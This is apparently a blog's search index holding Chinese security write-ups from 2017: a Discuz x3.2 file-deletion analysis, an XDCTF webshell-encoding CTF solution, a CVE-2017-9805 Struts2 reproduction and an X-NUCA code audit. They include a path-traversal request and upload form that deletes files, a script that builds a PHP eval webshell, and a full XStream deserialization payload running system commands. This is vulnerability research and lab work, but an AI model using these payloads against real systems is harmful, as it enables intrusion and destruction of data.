<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title></title>
    <url>%2F2017%2F10%2F22%2FDiscuz%20x%203.2%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[Discuz x 3.2 漏洞分析 a:focus { outline: thin dotted #333; outline: 5px auto -webkit-focus-ring-color; outline-offset: -2px; } a:hover, a:active { outline: 0; } a { color: #0088cc; text-decoration: none; } a:hover { color: #005580; text-decoration: underline; } p { margin: 0 0 1.1em; } small { font-size: 85%; } strong { font-weight: bold; } em { font-style: italic; } cite { font-style: normal; } h1.story_title { margin: 0.7em 0; } .story_tags { margin: 0 0 1.2em; } h1, h2, h3, h4, h5, h6 { margin: 0.5em 0; margin: 1.0em 0 .6em 0; font-family: inherit; font-weight: 500; line-height: 20px; color: inherit; text-rendering: optimizelegibility; } h1, h2, h3 { line-height: 40px; } h1 { font-size: 38.5px; } h2 { font-size: 31.5px; } h3 { font-size: 24.5px; } h4 { font-size: 17.5px; } h5 { font-size: 14px; } h6 { font-size: 11.9px; } ul, ol { padding: 0; margin: 0 0 10px 35px; } ul ul, ul ol, ol ol, ol ul { margin-bottom: 0; } dl { margin-bottom: 20px; } dt, dd { line-height: 20px; } dt { font-weight: bold; } dd { margin-left: 10px; } hr { margin: 20px 0; border: 0; border-top: 1px solid #eeeeee; border-bottom: 1px solid #ffffff; } abbr[title], abbr[data-original-title] { cursor: help; border-bottom: 1px dotted #999999; } blockquote { padding: 0 0 0 15px; margin: 0 0 20px; border-left: 5px solid #dddddd; } blockquote p { margin-bottom: 0; font-size: 16px; font-weight: 300; line-height: 25px; } blockquote small { display: block; line-height: 20px; color: #999999; } blockquote small:before { content: '\2014 \00A0'; } q:before, q:after, blockquote:before, blockquote:after { content: ""; } address { display: block; margin-bottom: 20px; font-style: normal; line-height: 20px; } img { height: auto; max-width: 100%; vertical-align: middle; border: 0; } table { max-width: 100%; background-color: transparent; border-collapse: collapse; border-spacing: 0; border: 1px solid rgba(34,36,38,.15); } .tag.label{ display: inline-block; vertical-align: baseline; line-height: 1; margin: 0.125em 0.125em; background-color: rgba(102,128,153,0.075); border-color: rgba(102,128,153,0.075); background-image: none; padding: 0.6em 0.8em; color: rgba(0, 0, 0, 0.6); text-transform: none; font-weight: bold; border-radius: 0.2857rem; box-sizing: border-box; font-size: 0.7428rem; } .table { width: 100%; margin-bottom: 20px; } .table th, .table td { padding: 8px; line-height: 20px; text-align: left; vertical-align: top; border-top: 1px solid #dddddd; } .table th { font-weight: bold; } .table thead th { vertical-align: bottom; } .table caption + thead tr:first-child th, .table caption + thead tr:first-child td, .table colgroup + thead tr:first-child th, .table colgroup + thead tr:first-child td, .table thead:first-child tr:first-child th, .table thead:first-child tr:first-child td { border-top: 0; } .table tbody + tbody { border-top: 2px solid #dddddd; } .table .table { background-color: #ffffff; } .table-striped tbody > tr:nth-child(odd) > td, .table-striped tbody > tr:nth-child(odd) > th { background-color: #f9f9f9; } tr { page-break-inside: avoid; } .story_image_container{ page-break-inside: avoid; } .xsj_underline{ page-break-after: always; visibility: hidden; } .table-celled.table tr td,.table-celled.table tr th { border-left: 1px solid rgba(34,36,38,.1) } .table-celled.table tr td:first-child,.table-celled.table tr th:first-child { border-left: none } .toc ul { list-style: none; } p { line-height: 1.6; } body>p { margin-bottom: 1.8em; } body>p>img.center, body>p>a>img.center { display: block; margin: 0 auto; background-color: rgba(128,128,128,0.3); } body { font-family: 'Helvetica Neue', Helvetica, Tahoma, Arial, 'Hiragino Sans GB', STHeiti, "Microsoft YaHei", "微软雅黑", 'WenQuanYi Micro Hei', STXihei, "华文细黑", Heiti, "黑体", SimSun, "宋体", Song, sans-serif; font-size: 18px; line-height: 1.33; font-weight: 100; // line-height: 1.8em; color: #2f2f2f; word-wrap: break-word; word-break: break-word; } em.cjk_emphasis{ font-style: normal; font-family: Georgia,"Times New Roman",Times,"楷体","AR PL UKai CN", "NSimSun","Songti SC","SimSun",serif!important; } body dt, body dd { line-height: 1.35em; } body code, body .xiaoshujiang_code { // background-color: #D6DBDF; border: 0; border-radius: 4px; // color: #2C3E50; font-size: 90%; // padding: 2px 4px; } code { background-color: rgba(214, 219, 223, 0.28); border-radius: 4px; color: #2C3E50; padding: 2px 4px; } .xiaoshujiang_code ol{ margin-bottom: 0px; } body h1 { line-height: 1.6; } body h2 { line-height: 1.1; } body h3 { line-height: 1.1; } .hljs, .hljs * { overflow: visible !important; } /** * Treeview syntax highlighting based on highlight.js * Copyright (c) 2014-2015, Asciidocfx Team, (MIT Licensed) * https://github.com/asciidocfx/highlight-treeview.js */ .language-treeview.hljs{ position: relative; } .hljs-folder, .hljs-hiddenfile, .hljs-file { position: relative; vertical-align: top; display: inline-block; height: 16px; } .hljs-folder:before, .hljs-file:before, .hljs-hiddenfile:before { top: 0; content: ''; width: 14px; height: 12px; margin-top: 0px; margin-right: 3px; position: relative; display: inline-block; background-size: 14px; background-repeat: no-repeat; } .hljs-file:before, .hljs-hiddenfile:before { height: 14px; margin-left: 1px; } .hljs-hiddenfile { opacity: 0.6; } .hljs-file.photo:before { font: normal normal normal 14px/1 FontAwesome; content: "\f1c5"; } .hljs-file.plain:before { font: normal normal normal 14px/1 FontAwesome; content: "\f016"; } .hljs-file.source:before { font: normal normal normal 14px/1 FontAwesome; content: "\f1c9"; } .hljs-file.archive:before { font: normal normal normal 14px/1 FontAwesome; content: "\f1c6"; } .hljs-file.audio:before { font: normal normal normal 14px/1 FontAwesome; content: "\f1c7"; } .hljs-file.video:before { font: normal normal normal 14px/1 FontAwesome; content: "\f1c8"; } .hljs-file.pdf:before { font: normal normal normal 14px/1 FontAwesome; content: "\f1c1"; } .hljs-file.xls:before { font: normal normal normal 14px/1 FontAwesome; content: "\f1c3"; } .hljs-file.doc:before { font: normal normal normal 14px/1 FontAwesome; content: "\f1c2"; } .hljs-file.ppt:before { font: normal normal normal 14px/1 FontAwesome; content: "\f1c4"; } .hljs-folder:before { font: normal normal normal 14px/1 FontAwesome; content: "\f114"; } .hljs-hiddenfile:before { font: normal normal normal 14px/1 FontAwesome; content: "\f016"; } .hljs-tvline { margin-left: 6px; position: absolute; text-indent: -99em; padding-bottom: 8px; vertical-align: top; display: inline-block; border-left-width: 1px; border-left-style: solid; border-left-color: rgb(94, 144, 117); } .hljs-folder-branch { width: 8px; height: 8px; margin-top: -1px; margin-left: 6px; text-indent: -99em; position: relative; vertical-align: top; display: inline-block; border-bottom-width: 1px; border-bottom-style: solid; border-bottom-color: rgb(94, 144, 117); } .hljs-folder-branch.win { width: 14px; margin-right: 2px; } .hljs-folder-last-branch { height: 7px; width: 7px; margin-left: 6px; text-indent: -99em; position: relative; vertical-align: top; display: inline-block; border-bottom-width: 1px; border-bottom-style: solid; border-bottom-color: rgb(94, 144, 117); border-left-width: 1px; border-left-style: solid; border-left-color: rgb(94, 144, 117); } .hljs-folder-last-branch.win { width: 13px; margin-right: 2px; } /** * Treeview syntax highlighting based on highlight.js */ .mark{ border: 0; background-color: rgba(221, 243, 231, 0.4); border-radius: 4px; color: #29754d; font-size: 90%; padding: 2px 4px; } .line_mark{ border: 1px dashed #3A4C42; margin-top: 2px; } code .mark, .xiaoshujiang_code .mark{ border-radius: 0px; font-size: initial; padding: initial; } a.attachment{ background-color: #ecf0f3; border: 1px solid #bec6cb; display: inline-block; padding: 5px; margin: 2px; min-width: 250px; } a.attachment i.fa{ font-size: 3em; float: left; margin-right: 0.2em; } a.attachment .filename{ vertical-align: top; text-align: left; font-weight: bold; } a.attachment .filesize{ display: -webkit-box; display: -moz-box; display: -ms-flexbox; display: -webkit-flex; display: flex; opacity: .6; font-size: 80%; white-space: nowrap; } .checkbox .checked{ text-decoration: line-through; } .flow-chart, .sequence-diagram{ text-align: center; } .plot, .plot-image{ text-align: center; min-height: 200px; min-width: 200px; } pre, .xiaoshujiang_pre { line-height: initial !important; word-wrap: break-word; word-break: break-word; tab-size: 4; white-space: pre-wrap; } .xiaoshujiang_code_container pre{ margin: 0px; } .xiaoshujiang_code_container.xiaoshujiang_code_chunk{ box-shadow: 0 0 0 1px #A3C293 inset,0 0 0 0 transparent; margin: 1em 0; padding: 1em; } .xiaoshujiang_code_container.xiaoshujiang_code_chunk_hide_code{ box-shadow: initial; padding: initial; padding-bottom: 2em; } .xiaoshujiang_code_container .out_put{ box-shadow: 0 0 0 1px #A3C293 inset,0 0 0 0 transparent; margin: 1em 0; background-color: #FCFFF5; color: #2C662D; padding: 1em; } .xiaoshujiang_code_container .out_put_error{ background-color: #FFF6F6; color: #9F3A38; margin: 1em 0; box-shadow: 0 0 0 1px #E0B4B4 inset,0 0 0 0 transparent; padding: 1em; } .xiaoshujiang_pre { font-family: monospace; } .story_align_left, .story_align_left .story_image_container { text-align: left; } .story_align_right, .story_align_right .story_image_container { text-align: right; } .story_align_center, .story_align_center .story_image_container { text-align: center; } .story_align_justify, .story_align_justify .story_image_container { text-align: justify; } /** * code line nums */ code.hljs.code_linenums, .xiaoshujiang_code.hljs.code_linenums{ position: relative; } .ol_linenums{ padding: 0px; margin-left: 30px; border-left: 1px solid #e0e0e0; } .li_linenum{ margin-left: 10px; list-style: none; counter-increment: lines 1; } .li_linenum.li_list_style{ list-style: inherit; margin-left: 5px; } .li_linenum:before, .li_linenum_before_span{ content: counter(lines, decimal); position: absolute; left: 0px; text-align: center; width: 2.5em; vertical-align: top; } .li_linenum_before_span_hide{ display: none; } .xiaoshujiang_code .code_line_break_hack{ margin:0; border:0; border-top:0; border-bottom:0; } /** * code line nums */ .mathjax-container{ text-align: center; } div.mathjax{ max-width: 600px; margin: 0 auto; font-size: 14px; } text{ font-size: 14px; } /** * block image */ .story_image_container{ text-align: center; } .story_image_container>.story_image{ display: inline-block; position: relative; max-width: 80%; } .story_image_caption{ border-bottom: 1px solid #d9d9d9; display: inline-block; color: #999; padding: 10px; } .story_image_blank_caption{ border-bottom: 0px; } /** .story_image:before, .story_image:after{ content: ''; position: absolute; z-index: -2; bottom: 13px; left: 10px; width: 50%; height: 20%; border-radius: 10px/90px; box-shadow: 0 15px 10px rgba(0,0,0,0.7); -webkit-transform: rotate(-3deg); -moz-transform: rotate(-3deg); -ms-transform: rotate(-3deg); -o-transform: rotate(-3deg); transform: rotate(-3deg); } .story_image:after { right: 10px; left: auto; -webkit-transform: rotate(3deg); -moz-transform: rotate(3deg); -ms-transform: rotate(3deg); -o-transform: rotate(3deg); transform: rotate(3deg); } **/ .story_image>img{ border-radius: 0.3125em; box-shadow: 0 2px 4px 0 rgba(34,36,38,.12),0 2px 10px 0 rgba(34,36,38,.08); } .story_inline_image>img{ max-width: 50%; vertical-align: bottom; } .story_remote_resource_block{ text-align: center; } .xiaoshujiang_code_container { margin: 1em 0px; position: relative; padding-bottom: 2em; } .xiaoshujiang_code_title_container{ font-size: 70%; opacity: 0.5; } .xiaoshujiang_code_title_container>.xiaoshujiang_code_infos{ float: right; } .task-list-item{ list-style: none; } .task-list-item.li_list_style{ list-style:inherit; } .task-list-item>input{ margin: 0 0 0 -20px; } .video_container{ width: 100%; display: table; text-align: center; position: relative; padding-bottom: 56.25%!important; } .slideshare_container .inner{ position: relative; width: 100%; } .slideshare_container .inner iframe{ width: 100%; height: 100%; position: absolute; top: 0; bottom: 0; left: 0; right: 0; } .video_container iframe{ width: 100%; height: 100%; position: absolute; top: 0; left: 0; z-index: 1; vertical-align: middle; } kbd{ display: inline-block; padding: 3px 5px; font-size: 11px; line-height: 10px; color: #555; vertical-align: middle; background-color: #fcfcfc; border: solid 1px #ccc; border-bottom-color: #bbb; border-radius: 3px; box-shadow: inset 0 -1px 0 #bbb; } .blank_anchor_id { float: left; } .blank_anchor_id { visibility: hidden; } .blank_anchor_id:before { content: 'a'; } blockquote footer{ margin: 1em 0; font-style: italic; } blockquote footer cite { margin: 0 1em; } /*wavedrom start*/ .wavedrom_svg text, .wavedrom_svg_defs text { font-size:11pt; font-style:normal; font-variant:normal; font-weight:normal; font-stretch:normal; text-align:center; fill-opacity:1; font-family:Helvetica } .wavedrom_svg .muted, .wavedrom_svg_defs .muted { fill:#aaa } .wavedrom_svg .warning, .wavedrom_svg_defs .warning { fill:#f6b900 } .wavedrom_svg .error, .wavedrom_svg_defs .error { fill:#f60000 } .wavedrom_svg .info, .wavedrom_svg_defs .info { fill:#0041c4 } .wavedrom_svg .success, .wavedrom_svg_defs .success { fill:#00ab00 } .wavedrom_svg .h1, .wavedrom_svg_defs .h1 { font-size:33pt; font-weight:bold } .wavedrom_svg .h2, .wavedrom_svg_defs .h2 { font-size:27pt; font-weight:bold } .wavedrom_svg .h3, .wavedrom_svg_defs .h3 { font-size:20pt; font-weight:bold } .wavedrom_svg .h4, .wavedrom_svg_defs .h4 { font-size:14pt; font-weight:bold } .wavedrom_svg .h5, .wavedrom_svg_defs .h5 { font-size:11pt; font-weight:bold } .wavedrom_svg .h6, .wavedrom_svg_defs .h6 { font-size:8pt; font-weight:bold } .wavedrom_svg_defs .s1 { fill:none; stroke:#000; stroke-width:1; stroke-linecap:round; stroke-linejoin:miter; stroke-miterlimit:4; stroke-opacity:1; stroke-dasharray:none } .wavedrom_svg_defs .s2 { fill:none; stroke:#000; stroke-width:0.5; stroke-linecap:round; stroke-linejoin:miter; stroke-miterlimit:4; stroke-opacity:1; stroke-dasharray:none } .wavedrom_svg_defs .s3 { color:#000; fill:none; stroke:#000; stroke-width:1; stroke-linecap:round; stroke-linejoin:miter; stroke-miterlimit:4; stroke-opacity:1; stroke-dasharray:1,3; stroke-dashoffset:0; marker:none; visibility:visible; display:inline; overflow:visible; enable-background:accumulate } .wavedrom_svg_defs .s4 { color:#000; fill:none; stroke:#000; stroke-width:1; stroke-linecap:round; stroke-linejoin:miter; stroke-miterlimit:4; stroke-opacity:1; stroke-dasharray:none; stroke-dashoffset:0; marker:none; visibility:visible; display:inline; overflow:visible } .wavedrom_svg_defs .s5 { fill:#fff; stroke:none } .wavedrom_svg_defs .s6 { color:#000; fill:#ffffb4; fill-opacity:1; fill-rule:nonzero; stroke:none; stroke-width:1px; marker:none; visibility:visible; display:inline; overflow:visible; enable-background:accumulate } .wavedrom_svg_defs .s7 { color:#000; fill:#ffe0b9; fill-opacity:1; fill-rule:nonzero; stroke:none; stroke-width:1px; marker:none; visibility:visible; display:inline; overflow:visible; enable-background:accumulate } .wavedrom_svg_defs .s8 { color:#000; fill:#b9e0ff; fill-opacity:1; fill-rule:nonzero; stroke:none; stroke-width:1px; marker:none; visibility:visible; display:inline; overflow:visible; enable-background:accumulate } .wavedrom_svg_defs .s9 { fill:#000; fill-opacity:1; stroke:none } .wavedrom_svg_defs .s10 { color:#000; fill:#fff; fill-opacity:1; fill-rule:nonzero; stroke:none; stroke-width:1px; marker:none; visibility:visible; display:inline; overflow:visible; enable-background:accumulate } .wavedrom_svg_defs .s11 { fill:#0041c4; fill-opacity:1; stroke:none } .wavedrom_svg_defs .s12 { fill:none; stroke:#0041c4; stroke-width:1; stroke-linecap:round; stroke-linejoin:miter; stroke-miterlimit:4; stroke-opacity:1; stroke-dasharray:none } /*wavedrom stop*/ .mermaid_svg{ font-family: monospace; } @media print{ body{ word-wrap: break-word; word-break: break-word; background: initial; } } /* Tomorrow Night Bright Theme */ /* Original theme - https://github.com/chriskempson/tomorrow-theme */ /* http://jmblog.github.com/color-themes-for-google-code-highlightjs */ /* Tomorrow Comment */ .hljs-comment, .hljs-quote { color: #969896; } /* Tomorrow Red */ .hljs-variable, .hljs-template-variable, .hljs-tag, .hljs-name, .hljs-selector-id, .hljs-selector-class, .hljs-regexp, .hljs-deletion { color: #d54e53; } /* Tomorrow Orange */ .hljs-number, .hljs-built_in, .hljs-builtin-name, .hljs-literal, .hljs-type, .hljs-params, .hljs-meta, .hljs-link { color: #e78c45; } /* Tomorrow Yellow */ .hljs-attribute { color: #e7c547; } /* Tomorrow Green */ .hljs-string, .hljs-symbol, .hljs-bullet, .hljs-addition { color: #b9ca4a; } /* Tomorrow Blue */ .hljs-title, .hljs-section { color: #7aa6da; } /* Tomorrow Purple */ .hljs-keyword, .hljs-selector-tag { color: #c397d8; } .hljs { display: block; overflow-x: auto; background: black; color: #eaeaea; padding: 0.5em; } .hljs-emphasis { font-style: italic; } .hljs-strong { font-weight: bold; } Discuz x 3.2 漏洞分析代码审计审计最近出来的Discuz 的漏洞 http://127.0.0.1/Discuz/upload/home.php?mod=spacecp&amp;ac=profile&amp;XDEBUG_SESSION_START=1 profilesubmit=1&amp;birthprovince=12345&amp;formhash=b7ef819d 0x01 爬坑 注册和登录都需要输入验证码吗，但根本没有要输入的地方，而且连图片也没有 第一步就是绕过验证 0x1 登录 这里需要改一下 0x2 注册 把第一个true改为false 0x02 漏洞定位 首先漏洞的发现过程是循序渐进的,有什么需要做什么都是一步一步来的 下面定位文件删除的漏洞点 可以利用现成的代码审计工具,这里我们利用rips 将代码定位到 source/include/spacecp/spacecp_profile.php 这里有好几处触发点我们一个一个分析其可能性 首先提交 验证第一个漏洞,这里之所以用profilesubmit和formhash是通过phpstorm动态调试出来的,如下图 发现有一个点绕不过去,就是type==file,所以另寻它法 这里只需要上传文件成功便可执行删除文件操作,所以这一点比较好绕过 0x03 代码回溯 有了删除操作,那么怎么将文件名可控呢,发现文件名为$space[$key] loadcache会加载$space变量,如果里面有新值那么就可以update信息 那么在这里直接执行下图数据,就可以修改成任意文件名 0x04 删除文件 万事具备只欠文件 下面是删除文件的操作 还记得回溯前的推理吗 只需提交一个文件就可以将现有的文件删除啦 看一下现有的文件路径 data/attachment/profile/目录下 只需../../../就可以删除根目录文件了(当然我们可以给文件加上权限) 0x05 综合利用 首先利用改文件名,将文件名改为../../../xxx home.php?mod=spacecp&amp;ac=profile&amp;op=base POST birthprovince=../../../test.txt&amp;profilesubmit=1&amp;formhash=b7ef819d 其次利用文件上传将原有文件删除 &lt;form action="http://127.0.0.1/Discuz/upload/home.php?mod=spacecp&amp;ac=profile&amp;op=base&amp;XDEBUG_SESSION_START=1" method="POST" enctype="multipart/form-data"&gt; &lt;input type="file" name="birthprovince" id="file" /&gt; &lt;input type="text" name="formhash" value="b7ef819d"/&gt;&lt;/p&gt; &lt;input type="text" name="profilesubmit" value="1"/&gt;&lt;/p&gt; &lt;input type="submit" value="Submit" /&gt; &lt;/from&gt; 0x06 脚本编写]]></content>
  </entry>
  <entry>
    <title><![CDATA[2017 XDCTF Upload]]></title>
    <url>%2F2017%2F10%2F06%2F2017%20XDCTF%20%20Upload%2F</url>
    <content type="text"><![CDATA[比赛早就结束了，有个web题目一直没想到怎么写直到官方发题解才知道，原来还有这一个套路（其实是一个知识点的），好久没有写博客了要长草了，写个博客记录一下 比赛早就结束了，有个web题目一直没想到怎么写直到官方发题解才知道，原来还有这一个套路（其实是一个知识点的），好久没有写博客了要长草了，写个博客记录一下0x01 base64 little trick在base64解码的时候其他多余字符是自动被忽略的 例如下图0x02 文件上传分析上传的文件我们可以看出过滤了大部分字符，只有actgACTG没有被过滤 猜想是利用这几个字符构造webshell，但是当时不知道小trick所以没有想到写脚本。0x03 脚本编写根据base64的小trick，写一个通用的脚本达到任意几个字符就可以构造webshell的目的下面来分析一下脚本的编写实现的过程是这样的，因为base64是四字节对齐所以我们用4字节进行全排列，然后解码找出只有一个合法字符的原字符串（生成字典），直到遍历完全排列的字符串，去掉值重复的值，本轮结束，查看有没有包含shellcode所需要的所有字符如果有直接输出。没有继续重复上述操作，并在接下来的每一步的最后来一个字符串映射。具体脚本如下：import itertoolsimport stringimport setsimport base64def permutation(strs): strings = [] for i in itertools.permutations(strs,4): s = ‘’.join(i) strings.append(s) return stringsdef create_dic(strs):#1 利用字符串创造字典 dic = {i:base64.b64decode(i) for i in permutation(strs)} return dicdef clac_shouldbe(dic):#2 筛选字典中value的值留下只有一个合法字符的键值对 # print dic new = {} should_be = string.ascii_uppercase+string.ascii_lowercase+string.digits+‘=’+‘/‘+‘+’ for key in dic: set1 = sets.Set(should_be) set2 = sets.Set(dic[key]) Intersect = ‘’.join(set1 &amp; set2) if len(Intersect) == 1: new[key]=Intersect return newdef remove_Dup(dic):#3 去value重复的键值对 mid = {dic[key]:key for key in dic} dic = {mid[key]:key for key in mid} return dicdef new_strs(dic):#去重之后生成新的字符串 s = ‘’ for key in dic: s += dic[key] return s.replace(‘=’,‘’)def strs_replaces(dic1,dic2):#4 字符串映射 revs = {dic1[key]:key for key in dic1} return {revs[key[0]]+revs[key[1]]+revs[key[2]]+revs[key[3]]:dic2[key] for key in dic2}def test_already(str1,str2):#判断时候全部包含shellcode所需要的值 set1 = sets.Set(str1) set2 = sets.Set(str2) Intersect = ‘’.join(set1 &amp; set2) # print Intersect if(len(Intersect) == len(set1)): return 1 else: return 0shell = “&lt;?php eval($_GET[a]);?&gt;”shell = base64.b64encode(shell)shell_base = ‘PD9waHAgZXZhbCgkX0dFVFthXSk7Pz4=’strs = ‘1234’#strings what you want to make up shellcode withdic = remove_Dup(clac_shouldbe(create_dic(strs)))strs = new_strs(dic)# print dic#create nonredundant value of dict ,once to decodefor i in range(1,6): print “Has based “+str(i) +‘ times ‘ dic1 = remove_Dup(clac_shouldbe(create_dic(strs))) strs = new_strs(dic1) dic = strs_replaces(dic,dic1) # print dic if test_already(shell_base,strs+‘=’): breakprint “Has based “+str(i+1) +‘ times ,you have decode ‘+str(i+1+1)+‘ times ‘revs = {dic[key]:key for key in dic}print ‘++++++++++++++++++++++++\n’print ‘’.join(revs[i] for i in shell_base)0x04 测试0x05 总结确实是一个巧妙的方法，有学习了一个姿势]]></content>
      <tags>
        <tag>write-up</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CVE-2017-9805（Struts2 漏洞复现与分析）]]></title>
    <url>%2F2017%2F09%2F07%2FCVE-2017-9805%EF%BC%88Struts2%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90%EF%BC%89%2F</url>
    <content type="text"><![CDATA[前天发布的新漏洞，以前Struts的漏洞也是经常出，今年三月份就有一次。但这类的洞一直没有跟进，今天也是想着把它给复现一下，同时搭个环境分析一下漏洞形成的原因。0x01 漏洞简介漏洞背景 2017年9月5日，Apache官方发布了一则公告，该公告称Apache Struts2的REST插件存在远程代码执行的高危漏洞，CVE编号为CVE-2017-9805。 Struts2 REST插件的XStre 前天发布的新漏洞，以前Struts的漏洞也是经常出，今年三月份就有一次。但这类的洞一直没有跟进，今天也是想着把它给复现一下，同时搭个环境分析一下漏洞形成的原因。0x01 漏洞简介漏洞背景 2017年9月5日，Apache官方发布了一则公告，该公告称Apache Struts2的REST插件存在远程代码执行的高危漏洞，CVE编号为CVE-2017-9805。 Struts2 REST插件的XStream组件存在反序列化漏洞，使用带有 XStream实例的 XStreamHandler进行反序列化操作时，未对数据内容进行有效验证，存在安全隐患，可被远程攻击。 0x02 环境搭建env版本docker16.04jdk1.8.0_144struts源码2.5.12tomcat8.0.46直接从官网下载相对应的源码0x1 dockerfileFROM ubuntu:16.04MAINTAINER 4t10n &lt;act01n@163.com&gt;ENV DEBIAN_FRONTEND noninteractiveRUN sed -i ‘s/archive.ubuntu.com/mirrors.ustc.edu.cn/g’ /etc/apt/sources.listRUN apt-get update -y \ &amp;&amp; apt-get install unzip\ &amp;&amp; apt-get install net-toolsWORKDIR /tmpCOPY ./apache-tomcat-8.0.46.tar.gz /tmp/COPY ./jdk.tar.gz /tmp/COPY ./struts.zip /tmp/COPY ./cmd.sh /tmp/RUN chmod a+x cmd.shEXPOSE 8080CMD [“/bin/bash”,“/tmp/cmd.sh”]cmd.shtar -xz -f jdk.tar.gz -C /usr/local/tar -xz -f apache-tomcat-8.0.46.tar.gz -C /usr/local/unzip struts.zip -d /usr/local/apache-tomcat-8.0.46/webappsmv /usr/local/apache-tomcat-8.0.46/webapps/struts-2.5.12/apps/struts2-rest-showcase.war ./../../# setup jdkecho ‘’’JAVA_HOME=/usr/local/jdk1.8.0_144JAVA_BIN=/usr/local/jdk1.8.0_144/binPATH=$PATH:$JAVA_BINCLASSPATH=$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jarexport JAVA_HOME JAVA_BIN PATH CLASSPATH‘’’&gt;&gt;/etc/profilesource /etc/profile/usr/local/apache-tomcat-8.0.46/bin/startup.sh/bin/bash相关源码在Github上0x2 攻击代码这里只是生成一个文件4ct10nPOST /struts2-rest-showcase/orders/3 HTTP/1.1Host: 192.168.43.165:8989User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateReferer: http://192.168.43.165:8989/struts2-rest-showcase/orders/3/editCookie: JSESSIONID=31A64A6CF6021DA63449D6DDEF10202FConnection: closeContent-Type: application/xmlContent-Length: 1656&lt;map&gt;&lt;entry&gt;&lt;jdk.nashorn.internal.objects.NativeString&gt; &lt;flags&gt;0&lt;/flags&gt; &lt;value class=“com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data”&gt; &lt;dataHandler&gt; &lt;dataSource class=“com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource”&gt; &lt;is class=“javax.crypto.CipherInputStream”&gt; &lt;cipher class=“javax.crypto.NullCipher”&gt; &lt;initialized&gt;false&lt;/initialized&gt; &lt;opmode&gt;0&lt;/opmode&gt; &lt;serviceIterator class=“javax.imageio.spi.FilterIterator”&gt; &lt;iter class=“javax.imageio.spi.FilterIterator”&gt; &lt;iter class=“java.util.Collections$EmptyIterator”/&gt; &lt;next class=“java.lang.ProcessBuilder”&gt; &lt;command&gt;&lt;string&gt;/usr/bin/touch&lt;/string&gt;&lt;string&gt;/home/4ct10n&lt;/string&gt; &lt;/command&gt; &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt; &lt;/next&gt; &lt;/iter&gt; &lt;filter class=“javax.imageio.ImageIO$ContainsFilter”&gt; &lt;method&gt; &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt; &lt;name&gt;start&lt;/name&gt; &lt;parameter-types/&gt; &lt;/method&gt; &lt;name&gt;foo&lt;/name&gt; &lt;/filter&gt; &lt;next class=“string”&gt;foo&lt;/next&gt; &lt;/serviceIterator&gt; &lt;lock/&gt; &lt;/cipher&gt; &lt;input class=“java.lang.ProcessBuilder$NullInputStream”/&gt; &lt;ibuffer&gt;&lt;/ibuffer&gt; &lt;done&gt;false&lt;/done&gt; &lt;ostart&gt;0&lt;/ostart&gt; &lt;ofinish&gt;0&lt;/ofinish&gt; &lt;closed&gt;false&lt;/closed&gt; &lt;/is&gt; &lt;consumed&gt;false&lt;/consumed&gt; &lt;/dataSource&gt; &lt;transferFlavors/&gt; &lt;/dataHandler&gt; &lt;dataLen&gt;0&lt;/dataLen&gt; &lt;/value&gt; &lt;/jdk.nashorn.internal.objects.NativeString&gt; &lt;jdk.nashorn.internal.objects.NativeString reference=“../jdk.nashorn.internal.objects.NativeString”/&gt; &lt;/entry&gt; &lt;entry&gt; &lt;jdk.nashorn.internal.objects.NativeString reference=“../../entry/jdk.nashorn.internal.objects.NativeString”/&gt; &lt;jdk.nashorn.internal.objects.NativeString reference=“../../entry/jdk.nashorn.internal.objects.NativeString”/&gt;&lt;/entry&gt;&lt;/map&gt;0x3 攻击后续其实在正真测试的时候已近发现了一些指令受了限制，但是一开始并没有进行研究，今天瞅了一眼freebuf文章，看是已经能够执行任何指令，这里是连接我在这也是实验了一发，试了一下文中说的其他指令，但唯独shell反弹没有成功文中主要说的利用方法是利用bash -c指令 具体格式如下&lt;command&gt;&lt;string&gt;bash&lt;/string&gt;&lt;string&gt;-c&lt;/string&gt;&lt;string&gt;echo asd &gt;/tmp/4ct10n&lt;/string&gt;&lt;/command&gt;怎么反弹shell ……. ，在线等0x02 漏洞分析未完待续]]></content>
      <tags>
        <tag>漏洞调试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2017 X-NUCA 代码审计]]></title>
    <url>%2F2017%2F08%2F26%2F2017%20X-NUCA%20%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%2F</url>
    <content type="text"><![CDATA[今天的比赛中的一道代码审计的题目。 今天的比赛中的一道代码审计的题目。step 1 初步审计发现所有的数据库操作都是 PDO操作，这也就意味着不可能是SQL注入了。查找flag出现的位置do_changepass.php user.php 发现如果是要获取flag 那么必须要更改userinfo数组的值····step 2 代码回溯我们发现在上述两个页面userinfo的值就是session的值，所以目标转化为更改session值，找到登录后的操作 在这里发现了$_session[userinfo]的赋值操作$userinfo，本来userinfo是数组，我们在这里有个变量覆盖 common.php 我们如果传入?userinfo=a那么就是一个字符串这时 $userinfo[“id”]=$userinfo[0]=a我们看register.php role = 1所以$_session[userinfo]=’1’ session是字符串1这时再次访问do_changepass.php即可]]></content>
      <tags>
        <tag>write-up</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Docker 使用总结]]></title>
    <url>%2F2017%2F08%2F20%2FDocker%20%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93%2F</url>
